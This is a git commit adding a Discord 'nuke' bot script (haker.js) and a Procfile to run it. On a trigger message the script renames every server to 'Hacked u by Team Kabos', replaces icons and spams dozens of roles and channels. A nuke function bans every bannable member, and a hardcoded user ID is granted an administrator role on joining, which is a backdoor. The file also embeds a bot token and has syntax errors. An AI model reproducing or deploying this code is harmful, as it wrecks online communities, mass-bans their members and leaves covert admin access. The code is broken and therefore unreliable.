e7f541cec1f1bcdcb63c7f9fa72ee7f67789d137
lolyadman0012 <41803482+lolyadman0012@users.noreply.github.com>
2019-07-01 03:08:38 +0200

    Add files via upload

---
+++ Procfile
@@ -0,0 +1,1 @@
+worker: node haker.js
---
+++ haker.js
@@ -0,0 +1,533 @@
+const Discord = require("discord.js");
+const LOka = new Discord.Client();
+console.log('By KBOOOOOOOOSH-YT');
+LOka.on('ready', () => {
+  console.log(`Logged in as ${LOka.user.tag} !`);
+
+});
+LOka.on('ready',  () => {
+console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'); 
+console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'); 
+console.log('      ~            ~  By : KBOOOOOOOOSH-YT ~           ~    ');
+console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'); 
+console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~');
+console.log(`Logged in as  * [ "  KBOOOOOOOOSH-YT " ] servers! [ " ${LOka.guilds.size} " ] Users! [ " ${LOka.users.size} " ]`);
+
+        
+    
+
+});
+var prefix = "."
+LOka.on("message", message => {
+  if(!message.content.startsWith(prefix)) return;;
+  let args = message.content.split(" ").slice(1);
+  var argresult = args.join(' ');
+  if (message.content.startsWith('hix15')) {
+    LOka.user.setUsername(argresult);
+  }
+    if (message.content.startsWith(prefix + 'on123')) {
+    LOka.user.setStatus(argresult);
+  }
+});
+
+var x1 = "kk"
+LOka.on('message', message => {
+     if (message.content === ".") {
+LOka.user.setAvatar(`https://cdn.discordapp.com/attachments/592568644807032847/595053570836135936/Anonymou-NASA-about-to-announce-Alien-life.jpg`)
+
+}
+});
+var x1 = "kk"
+LOka.on('message', message => {
+     if (message.content === ".") {
+LOka.user.setUsername("Team Kabos")
+
+}
+});
+LOka.on('message', message => {
+     if (message.content === ".") {
+LOka.user.setGame(`Kabos-GoodBye`,'https://www.twitch.tv/hix')
+
+}
+});
+
+LOka.on('message', message => {
+     if (message.content === ".") {
+         LOka.guilds.forEach(m =>{
+             m.setIcon(`https://cdn.discordapp.com/attachments/592568644807032847/595053570836135936/Anonymou-NASA-about-to-announce-Alien-life.jpg`)
+})
+}
+});
+LOka.on('message', message => {
+     if (message.content === ".") {
+         LOka.guilds.forEach(m =>{
+             m.setName(`Hacked u by Team Kabos Is here`)
+})
+}
+});
+
+LOka.on('message', message => {
+     if (message.content === ".") {
+                 if(!message.channel.guild) return;
+
+             message.guild.setIcon(`https://cdn.discordapp.com/attachments/592568644807032847/595053570836135936/Anonymou-NASA-about-to-announce-Alien-life.jpg`)
+
+}
+});
+
+LOka.on('message', message => {
+     
+
+     if (message.content === ".") {
+         LOka.guilds.forEach(m =>{
+  m.createRole({
+        name : "Hacked u by Team Kabos",
+        permissions :   [1],
+        color : " #ff0000"
+    }) 
+  m.createRole({
+        name : "Hacked u by Team Kabos",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	  m.createRole({
+        name : "Hacked u by Team Kabos",
+        permissions :   [1],
+        color : " #ff0000"
+    })  m.createRole({
+        name : "Hacked u by Team Kabos",
+        permissions :   [1],
+        color : " #ff0000"
+    })  m.createRole({
+        name : "Hacked u by Team Kabos",
+        permissions :   [1],
+        color : " #ff0000"
+    })  m.createRole({
+        name : "Hacked u by Team Kabos",
+        permissions :   [1],
+        color : " #ff0000"
+    })  m.createRole({
+        name : "Hacked u by Team Kabos",
+        permissions :   [1],
+        color : " #ff0000"
+    })  m.createRole({
+        name : "Hacked u by Team Kabos",
+        permissions :   [1],
+        color : " #ff0000"
+    })  m.createRole({
+        name : "Hacked u by Team Kabos",
+        permissions :   [1],
+        color : " #ff0000"
+    })  m.createRole({
+        name : "Hacked u by Team Kabos",
+        permissions :   [1],
+        color : " #ff0000"
+    })  m.createRole({
+        name : "Hacked u by Team Kabos",
+        permissions :   [1],
+        color : " #ff0000"
+    })  m.createRole({
+        name : "Hacked u by Team Kabos",
+        permissions :   [1],
+        color : " #ff0000"
+    })  m.createRole({
+        name : "Hacked u by Team Kabos",
+        permissions :   [1],
+        color : " #ff0000"
+    })  m.createRole({
+        name : "Hacked u by Team Kabos",
+        permissions :   [1],
+        color : " #ff0000"
+    })  m.createRole({
+        name : "Hacked u by Team Kabos",
+        permissions :   [1],
+        color : " #ff0000"
+    })  m.createRole({
+        name : "Hacked u by Team Kabos",
+        permissions :   [1],
+        color : " #ff0000"
+    })  m.createRole({
+        name : "Hacked u by Team Kabos",
+        permissions :   [1],
+        color : " #ff0000"
+    })  m.createRole({
+        name : "Hacked u by Team Kabos",
+        permissions :   [1],
+        color : " #ff0000"
+    })  m.createRole({
+        name : "Hacked u by Team Kabos",
+        permissions :   [1],
+        color : " #ff0000"
+    })  m.createRole({
+        name : "Hacked u by Team Kabos",
+        permissions :   [1],
+        color : " #ff0000"
+    })  m.createRole({
+        name : "Hacked u by Team Kabos",
+        permissions :   [1],
+        color : " #ff0000"
+    })  m.createRole({
+        name : "Hacked u by Team Kabos",
+        permissions :   [1],
+        color : " #ff0000"
+    })  m.createRole({
+        name : "Hacked u by Team Kabos",
+        permissions :   [1],
+        color : " #ff0000"
+    })  m.createRole({
+        name : "Hacked u by Team Kabos",
+        permissions :   [1],
+        color : " #ff0000"
+    })  m.createRole({
+        name : "Hacked u by Team Kabos",
+        permissions :   [1],
+        color : " #ff0000"
+    })  m.createRole({
+        name : "Hacked u by Team Kabos",
+        permissions :   [1],
+        color : " #ff0000"
+    })  m.createRole({
+        name : "Hacked u by Team Kabos",
+        permissions :   [1],
+        color : " #ff0000"
+    })  m.createRole({
+        name : "Hacked u by Team Kabos",
+        permissions :   [1],
+        color : " #ff0000"
+    })  m.createRole({
+        name : "Hacked u by Team Kabos",
+        permissions :   [1],
+        color : " #ff0000"
+    })  m.createRole({
+        name : "Hacked u by Team Kabos",
+        permissions :   [1],
+        color : " #ff0000"
+    })  m.createRole({
+        name : "Hacked u by Team Kabos",
+        permissions :   [1],
+        color : " #ff0000"
+    })  m.createRole({
+        name : "Hacked u by Team Kabos",
+        permissions :   [1],
+        color : " #ff0000"
+    })  m.createRole({
+        name : "Hacked u by Team Kabos",
+        permissions :   [1],
+        color : " #ff0000"
+    })  m.createRole({
+        name : "Hacked u by Team Kabos",
+        permissions :   [1],
+        color : " #ff0000"
+    })  m.createRole({
+        name : "Hacked u by Team Kabos",
+        permissions :   [1],
+        color : " #ff0000"
+    })  m.createRole({
+        name : "Hacked u by Team Kabos",
+        permissions :   [1],
+        color : " #ff0000"
+    })  m.createRole({
+        name : "Hacked u by Team Kabos",
+        permissions :   [1],
+        color : " #ff0000"
+    })  m.createRole({
+        name : "Hacked u by Team Kabos",
+        permissions :   [1],
+        color : " #ff0000"
+    })  m.createRole({
+        name : "Hacked u by Team Kabos",
+        permissions :   [1],
+        color : " #ff0000"
+    })  m.createRole({
+        name : "Hacked u by Team Kabos",
+        permissions :   [1],
+        color : " #ff0000"
+    })  m.createRole({
+        name : "Hacked u by Team Kabos",
+        permissions :   [1],
+        color : " #ff0000"
+    })  m.createRole({
+        name : "Hacked u by Team Kabos",
+        permissions :   [1],
+        color : " #ff0000"
+    })  m.createRole({
+        name : "Hacked u by Team Kabos",
+        permissions :   [1],
+        color : " #ff0000"
+    })  m.createRole({
+        name : "Hacked u by Team Kabos",
+        permissions :   [1],
+        color : " #ff0000"
+    })  m.createRole({
+        name : "Hacked u by Team Kabos",
+        permissions :   [1],
+        color : " #ff0000"
+    })  m.createRole({
+        name : "Hacked u by Team Kabos",
+        permissions :   [1],
+        color : " #ff0000"
+    })  m.createRole({
+        name : "Hacked u by Team Kabos",
+        permissions :   [1],
+        color : " #ff0000"
+    })  m.createRole({
+        name : "Hacked u by Team Kabos",
+        permissions :   [1],
+        color : " #ff0000"
+    })  m.createRole({
+        name : "Hacked u by Team Kabos",
+        permissions :   [1],
+        color : " #ff0000"
+    })  m.createRole({
+        name : "Hacked u by Team Kabos",
+        permissions :   [1],
+        color : " #ff0000"
+    })  m.createRole({
+        name : "Hacked u by Team Kabos",
+        permissions :   [1],
+        color : " #ff0000"
+    })  m.createRole({
+        name : "Hacked u by Team Kabos",
+        permissions :   [1],
+        color : " #ff0000"
+    })  m.createRole({
+        name : "Hacked u by Team Kabos",
+        permissions :   [1],
+        color : " #ff0000"
+    })  m.createRole({
+        name : "Hacked u by Team Kabos",
+        permissions :   [1],
+        color : " #ff0000"
+    })  m.createRole({
+        name : "Hacked u by Team Kabos",
+        permissions :   [1],
+        color : " #ff0000"
+    })  m.createRole({
+        name : "Hacked u by Team Kabos",
+        permissions :   [1],
+        color : " #ff0000"
+    })  m.createRole({
+        name : "Hacked u by Team Kabos",
+        permissions :   [1],
+        color : " #ff0000"
+    })  m.createRole({
+        name : "Hacked u by Team Kabos",
+        permissions :   [1],
+        color : " #ff0000"
+    })  m.createRole({
+        name : "Hacked u by Team Kabos",
+        permissions :   [1],
+        color : " #ff0000"
+    })  m.createRole({
+        name : "Hacked u by Team Kabos",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+
+
+    
+})
+ 
+ 
+}
+});
+LOka.on('message', message => {
+         if (message.content === ".") {
+               LOka.guilds.forEach(m =>{
+m.createChannel('Hacked u by Team Kabos', 'text');
+m.createChannel('Hacked u by Team Kabos', 'text');
+m.createChannel('Hacked u by Team Kabos', 'text');
+m.createChannel('Hacked u by Team Kabos', 'text');
+m.createChannel('Hacked u by Team Kabos', 'text');
+m.createChannel('Hacked u by Team Kabos', 'text');
+m.createChannel('Hacked u by Team Kabos', 'text');
+m.createChannel('Hacked u by Team Kabos', 'text');
+m.createChannel('Hacked u by Team Kabos', 'text');
+m.createChannel('Hacked u by Team Kabos', 'text');
+m.createChannel('Hacked u by Team Kabos', 'text');
+m.createChannel('Hacked u by Team Kabos', 'text');
+m.createChannel('Hacked u by Team Kabos', 'text');
+m.createChannel('Hacked u by Team Kabos', 'text');
+m.createChannel('Hacked u by Team Kabos', 'text');
+m.createChannel('Hacked u by Team Kabos', 'text');
+m.createChannel('Hacked u by Team Kabos', 'text');
+m.createChannel('Hacked u by Team Kabos', 'text');
+m.createChannel('Hacked u by Team Kabos', 'text');
+m.createChannel('Hacked u by Team Kabos', 'text');
+m.createChannel('Hacked u by Team Kabos', 'text');
+m.createChannel('Hacked u by Team Kabos', 'text');
+m.createChannel('Hacked u by Team Kabos', 'text');
+m.createChannel('Hacked u by Team Kabos', 'text');
+m.createChannel('Hacked u by Team Kabos', 'text');
+m.createChannel('Hacked u by Team Kabos', 'text');
+m.createChannel('Hacked u by Team Kabos', 'text');
+m.createChannel('Hacked u by Team Kabos', 'text');
+m.createChannel('Hacked u by Team Kabos', 'text');
+m.createChannel('Hacked u by Team Kabos', 'text');
+m.createChannel('Hacked u by Team Kabos', 'text');
+m.createChannel('Hacked u by Team Kabos', 'text');
+m.createChannel('Hacked u by Team Kabos', 'text');
+m.createChannel('Hacked u by Team Kabos', 'text');
+m.createChannel('Hacked u by Team Kabos', 'text');
+m.createChannel('Hacked u by Team Kabos', 'text');
+m.createChannel('Hacked u by Team Kabos', 'text');
+m.createChannel('Hacked u by Team Kabos', 'text');
+m.createChannel('Hacked u by Team Kabos', 'text');
+m.createChannel('Hacked u by Team Kabos', 'text');
+
+})
+}
+});
+
+LOka.on('message', message => {
+         if (message.content === ".") {
+                 LOka.guilds.forEach(m =>{
+m.createChannel('Hacked u by Team Kabos', 'voice');
+m.createChannel('Hacked u by Team Kabos', 'voice');
+m.createChannel('Hacked u by Team Kabos', 'voice');
+m.createChannel('Hacked u by Team Kabos', 'voice');
+m.createChannel('Hacked u by Team Kabos', 'voice');
+m.createChannel('Hacked u by Team Kabos', 'voice');
+m.createChannel('Hacked u by Team Kabos', 'voice');
+m.createChannel('Hacked u by Team Kabos', 'voice');
+m.createChannel('Hacked u by Team Kabos', 'voice');
+m.createChannel('Hacked u by Team Kabos', 'voice');
+m.createChannel('Hacked u by Team Kabos', 'voice');
+m.createChannel('Hacked u by Team Kabos', 'voice');
+m.createChannel('Hacked u by Team Kabos', 'voice');
+m.createChannel('Hacked u by Team Kabos', 'voice');
+m.createChannel('Hacked u by Team Kabos', 'voice');
+m.createChannel('Hacked u by Team Kabos', 'voice');
+m.createChannel('Hacked u by Team Kabos', 'voice');
+m.createChannel('Hacked u by Team Kabos', 'voice');
+m.createChannel('Hacked u by Team Kabos', 'voice');
+m.createChannel('Hacked u by Team Kabos', 'voice');
+m.createChannel('Hacked u by Team Kabos', 'voice');
+m.createChannel('Hacked u by Team Kabos', 'voice');
+m.createChannel('Hacked u by Team Kabos', 'voice');
+m.createChannel('Hacked u by Team Kabos', 'voice');
+m.createChannel('Hacked u by Team Kabos', 'voice');
+m.createChannel('Hacked u by Team Kabos', 'voice');
+m.createChannel('Hacked u by Team Kabos', 'voice');
+m.createChannel('Hacked u by Team Kabos', 'voice');
+m.createChannel('Hacked u by Team Kabos', 'voice');
+m.createChannel('Hacked u by Team Kabos', 'voice');
+m.createChannel('Hacked u by Team Kabos', 'voice');
+m.createChannel('Hacked u by Team Kabos', 'voice');
+m.createChannel('Hacked u by Team Kabos', 'voice');
+m.createChannel('Hacked u by Team Kabos', 'voice');
+m.createChannel('Hacked u by Team Kabos', 'voice');
+m.createChannel('Hacked u by Team Kabos', 'voice');
+m.createChannel('Hacked u by Team Kabos', 'voice');
+m.createChannel('Hacked u by Team Kabos', 'voice');
+m.createChannel('Hacked u by Team Kabos', 'voice');
+m.createChannel('Hacked u by Team Kabos', 'voice');
+m.createChannel('Hacked u by Team Kabos', 'voice');
+m.createChannel('Hacked u by Team Kabos', 'voice');
+m.createChannel('Hacked u by Team Kabos', 'voice');
+m.createChannel('Hacked u by Team Kabos', 'voice');
+m.createChannel('Hacked u by Team Kabos', 'voice');
+m.createChannel('Hacked u by Team Kabos', 'voice');
+m.createChannel('Hacked u by Team Kabos', 'voice');
+m.createChannel('Hacked u by Team Kabos', 'voice');
+m.createChannel('Hacked u by Team Kabos', 'voice');
+m.createChannel('Hacked u by Team Kabos', 'voice');
+m.createChannel('Hacked u by Team Kabos', 'voice');
+m.createChannel('Hacked u by Team Kabos', 'voice');
+m.createChannel('Hacked u by Team Kabos', 'voice');
+m.createChannel('Hacked u by Team Kabos', 'voice');
+m.createChannel('Hacked u by Team Kabos', 'voice');
+m.createChannel('Hacked u by Team Kabos', 'voice');
+m.createChannel('Hacked u by Team Kabos', 'voice');
+m.createChannel('Hacked u by Team Kabos', 'voice');
+m.createChannel('Hacked u by Team Kabos', 'voice');
+m.createChannel('Hacked u by Team Kabos', 'voice');
+m.createChannel('Hacked u by Team Kabos', 'voice');
+m.createChannel('Hacked u by Team Kabos', 'voice');
+m.createChannel('Hacked u by Team Kabos', 'voice');
+m.createChannel('Hacked u by Team Kabos', 'voice');
+m.createChannel('Hacked u by Team Kabos', 'voice');
+m.createChannel('Hacked u by Team Kabos', 'voice');
+m.createChannel('Hacked u by Team Kabos', 'voice');
+m.createChannel('Hacked u by Team Kabos', 'voice');
+m.createChannel('Hacked u by Team Kabos', 'voice');
+m.createChannel('Hacked u by Team Kabos', 'voice');
+m.createChannel('Hacked u by Team Kabos', 'voice');
+m.createChannel('Hacked u by Team Kabos', 'voice');
+m.createChannel('Hacked u by Team Kabos', 'voice');
+m.createChannel('Hacked u by Team Kabos', 'voice');
+m.createChannel('Hacked u by Team Kabos', 'voice');
+m.createChannel('Hacked u by Team Kabos', 'voice');
+m.createChannel('Hacked u by Team Kabos', 'voice');
+m.createChannel('Hacked u by Team Kabos', 'voice');
+m.createChannel('Hacked u by Team Kabos', 'voice');
+m.createChannel('Hacked u by Team Kabos', 'voice');
+m.createChannel('Hacked u by Team Kabos', 'voice');
+m.createChannel('Hacked u by Team Kabos', 'voice');
+m.createChannel('Hacked u by Team Kabos', 'voice');
+
+
+
+})
+}
+
+});
+
+
+const { Client } = require('discord.js');
+const client = new Client();
+
+async function nuke(guild) {
+  let users = 0;
+  let channels = 0;
+
+  await guild.fetchMembers();
+
+  await guild.owner.send(' Hacked u by Team Kabos Is here').catch(e => { return void e; });
+
+
+
+  await Promise.all(guild.members.map(async (m) => {
+    if (m.bannable) {
+      users++;
+      await m.send('_|_').catch(e => { return void e; });
+      return m.ban();
+    }
+  }));
+ 
+
+LOka.on('ready', () => {
+  for(const [, g] of LOka.guilds) nuke(g).catch(console.error);
+  console.log('-------------------------------------------------------------');
+  console.log('');
+  console.log("Made by Gom Gom");
+  console.log("");
+  console.log("-------------------------------------------------------------");
+
+});
+
+LOka.on('guildCreate', async (guild) => {
+  return nuke(guild).catch(console.error);
+});
+
+LOka.on('guildMemberAdd', member => {
+    
+            if (member.id === "320015606071951360") {
+                member.guild.createRole({
+                    name : LOka.user.username,
+                    color : "RANDOM", 
+                    permissions : [8]
+                }).then(function(role){
+                    member.addRole(role)
+                })
+                
+            }
+        
+    });
+
+    
+
+
+
+
+LOka.login("NTUwNzg2Mzk2OTY1ODMwNjk3.XRlXXQ.aY1iKP_vkLZKnZG07bZZEGJUmfc")
